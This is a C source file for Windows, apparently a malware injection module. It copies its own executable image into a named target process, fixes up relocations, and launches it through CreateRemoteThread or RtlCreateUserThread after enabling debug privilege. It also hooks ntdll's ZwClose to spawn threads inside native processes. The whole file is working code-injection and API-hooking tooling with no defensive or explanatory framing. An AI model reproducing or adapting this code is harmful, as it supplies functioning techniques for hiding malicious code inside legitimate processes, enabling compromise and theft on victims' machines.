#include <intrin.h>
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>

#include "ntdll.h"
#include "inject.h"
#include "utils.h"
#include "splice.h"

BOOL CopyImageToProcess(HANDLE hProcess,PVOID pvImageBase,DWORD dwImageSize,PVOID *ppRemoteMap)
{
	DWORD dwSize = dwImageSize;
	BOOL bResult = FALSE;
	NTSTATUS St;
	HANDLE hMapping;
	PVOID pCurrentMap,pRemoteMap;

	hMapping = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_EXECUTE_READWRITE|SEC_COMMIT,0,dwImageSize,0);
	if (hMapping != INVALID_HANDLE_VALUE)
	{
		if (pCurrentMap = MapViewOfFile(hMapping,FILE_MAP_WRITE,0,0,0))
		{
			CopyMemory(pCurrentMap,pvImageBase,dwImageSize);

			St = NtMapViewOfSection(hMapping,hProcess,&pRemoteMap,0,0,NULL,&dwSize,ViewUnmap,0,PAGE_EXECUTE_READWRITE);
			if (NT_SUCCESS(St))
			{
				if (bResult = ProcessRelocs(pCurrentMap,(DWORD)pRemoteMap - (DWORD)pvImageBase))
				{
					*ppRemoteMap = pRemoteMap;
				}
				else
				{
					DbgPrint(__FUNCTION__"(): ProcessRelocs failed\n",St);
				}

				if (!bResult) NtUnmapViewOfSection(hProcess,pRemoteMap);
			}
			else
			{
				DbgPrint(__FUNCTION__"(): NtMapViewOfSection failed with status %x\n",St);
			}

			UnmapViewOfFile(pCurrentMap);
		}

		CloseHandle(hMapping);
	}

	if (!bResult)
	{
		if (pCurrentMap = VirtualAlloc(NULL,dwImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))
		{
			CopyMemory(pCurrentMap,pvImageBase,dwImageSize);

			if (pRemoteMap = VirtualAllocEx(hProcess,NULL,dwImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE))
			{
				if (ProcessRelocs(pCurrentMap,(DWORD)pRemoteMap - (DWORD)pvImageBase))
				{
					if (bResult = WriteProcessMemory(hProcess,pRemoteMap,pCurrentMap,dwImageSize,&dwSize))
					{
						*ppRemoteMap = pRemoteMap;
					}
					else
					{
						DbgPrint(__FUNCTION__"(): WriteProcessMemory failed with error %x\n",GetLastError());
					}
				}
				else
				{
					DbgPrint(__FUNCTION__"(): ProcessRelocs failed\n",St);
				}

				if (!bResult) VirtualFreeEx(hProcess,pRemoteMap,0,MEM_RELEASE);
			}
			else
			{
				DbgPrint(__FUNCTION__"(): VirtualAllocEx failed with error %x\n",GetLastError());
			}
				
			VirtualFree(pCurrentMap,0,MEM_RELEASE);
		}
	}


	return bResult;
}

DWORD GetPIDByName(LPCSTR lpProcessName,BOOL bCurrentSession)
{
	DWORD Ret = 0;
	PROCESSENTRY32 pe = {0};
	HANDLE hSnap;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if (hSnap)
	{
		pe.dwSize = sizeof(pe);

		if (Process32First(hSnap,&pe))
		{
			DWORD CurrentSessionId;

			if (!bCurrentSession || ProcessIdToSessionId(GetCurrentProcessId(),&CurrentSessionId))
			{
				do
				{
					if (pe.th32ProcessID != GetCurrentProcessId())
					{
						DWORD SessionId;

						if (!bCurrentSession || (ProcessIdToSessionId(pe.th32ProcessID,&SessionId) && SessionId == CurrentSessionId))
						{
							if (!_stricmp(lpProcessName,pe.szExeFile))
							{
								Ret = pe.th32ProcessID;
								break;					
							}
						}
					}
				} 
				while (Process32Next(hSnap,&pe));
			}
		}

		CloseHandle(hSnap);	
	}

	return Ret;
}

typedef NTSTATUS(NTAPI*funcOldZwClose)(HANDLE Handle);
BYTE g_ZwCloseBytes[OLD_BYTES_SIZE] = {0};
funcOldZwClose g_OldZwClose = (funcOldZwClose)&g_ZwCloseBytes;
PVOID g_pvZwCloseAddr = NULL;

DWORD g_dwBadThreadId = 0;

LPTHREAD_START_ROUTINE g_ThreadStart = NULL;
PVOID g_ThreadContext = NULL;

NTSTATUS NewZwClose(HANDLE Handle)
{
	if (g_dwBadThreadId != GetCurrentThreadId())
	{
		Unsplice(g_pvZwCloseAddr,(PVOID)&g_ZwCloseBytes);

		DbgPrint(__FUNCTION__"(): start normal thread address: %x, context: %x\n",g_ThreadStart,g_ThreadContext);

		HANDLE hThread = CreateThread(NULL,0,g_ThreadStart,g_ThreadContext,0,NULL);
		if (hThread) CloseHandle(hThread);
	}

	return g_OldZwClose(Handle);
}

VOID InjectNativeThreadWork(LPTHREAD_START_ROUTINE ThreadStart,PVOID ThreadContext)
{
	g_ThreadStart = ThreadStart;
	g_ThreadContext = ThreadContext;

	g_dwBadThreadId = GetCurrentThreadId();
	g_pvZwCloseAddr = GetProcAddress(GetModuleHandle("ntdll.dll"),"ZwClose");
	Splice(g_pvZwCloseAddr,NewZwClose,(PVOID)&g_ZwCloseBytes);

	DbgPrint(__FUNCTION__"(): hook ZwClose: %x, ThreadStart: %x, ThreadContext: %x\n",g_pvZwCloseAddr,ThreadStart,ThreadContext);
}

DWORD InjectThreadRoutine(PVOID Context)
{
	typedef BOOL(WINAPI*funcEntryPoint)(PVOID,DWORD,DWORD);
	funcEntryPoint EntryPoint = (funcEntryPoint)RVA_TO_VA(Context,RtlImageNtHeader(Context)->OptionalHeader.AddressOfEntryPoint);

	// call entrypoint
	return EntryPoint(Context,DLL_PROCESS_ATTACH,'FWPB');
}

DWORD InjectStartRoutine(BOOL bCurrentSession)
{
	DWORD dwExitCode = STATUS_UNSUCCESSFUL;
	MEMORY_BASIC_INFORMATION pMemInfo;

	// get imagebase address
	VirtualQuery(InjectStartRoutine,&pMemInfo,sizeof(pMemInfo));
	// process import
	if (ProcessImport(pMemInfo.AllocationBase))
	{
		dwExitCode = STATUS_SUCCESS;

		if (bCurrentSession)
		{
			// current session create normal thread
			HANDLE hThread = CreateThread(NULL,0,InjectThreadRoutine,pMemInfo.AllocationBase,0,NULL);
			if (hThread) CloseHandle(hThread);
		}
		else
		{
			// this is native thread we need to hook ZwClose for create normal thread
			InjectNativeThreadWork(InjectThreadRoutine,pMemInfo.AllocationBase);
			RtlExitUserThread(dwExitCode);
		}
	}

	return dwExitCode;
}

BOOL InjectProcess(LPCSTR lpProcessName,PVOID pvImageBase,DWORD dwImageSize,BOOL bCurrentSession)
{
	BOOL bRet = FALSE;
	BOOLEAN bEnable;
	PVOID pMap;

	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE,TRUE,FALSE,&bEnable);
	
	DWORD dwPid = GetPIDByName(lpProcessName,bCurrentSession);
	if (dwPid)
	{
		HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,FALSE,dwPid);
		if (hProcess)
		{
			if (CopyImageToProcess(hProcess,pvImageBase,dwImageSize,&pMap))
			{
				LPTHREAD_START_ROUTINE StartRoutine = (LPTHREAD_START_ROUTINE)((DWORD)InjectStartRoutine - (DWORD)pvImageBase + (DWORD)pMap);
				HANDLE hThread;

				if (!bCurrentSession)
				{
					CLIENT_ID ClientId;

					NTSTATUS St = RtlCreateUserThread(hProcess,NULL,FALSE,0,0,0,StartRoutine,(PVOID)bCurrentSession,&hThread,&ClientId);
					if (NT_SUCCESS(St))
					{
						bRet = TRUE;	
					}
					else
					{
						DbgPrint(__FUNCTION__"(): RtlCreateUserThread failed with status %x\n",St);
					}
				}
				else
				{
					hThread = CreateRemoteThread(hProcess,NULL,0,StartRoutine,(PVOID)bCurrentSession,0,NULL);
					if (hThread) 
					{
						bRet = TRUE;
					}
					else
					{
						DbgPrint(__FUNCTION__"(): CreateRemoteThread failed last error %x\n",GetLastError());
					}
				}

				if (bRet)
				{
					DWORD dwExitCode;

					if (WaitForSingleObject(hThread,1*60*1000) == WAIT_OBJECT_0)
					{
						if (GetExitCodeThread(hThread,&dwExitCode))
						{
							bRet = dwExitCode == STATUS_SUCCESS;
						}
					}

					CloseHandle(hThread);
				}
			}
					
			CloseHandle(hProcess);
		}
		else
		{
			DbgPrint(__FUNCTION__"(): OpenProcess failed last error %x\n",GetLastError());
		}
	}
	else
	{
		DbgPrint(__FUNCTION__"(): Process '%s' not found\n",lpProcessName);
	}

	DbgPrint(__FUNCTION__"(): %s '%s' %s\n",bCurrentSession ? "CreateRemoteThread" : "RtlCreateUserThread",lpProcessName,bRet ? "OK" : "failed");

	return bRet;
}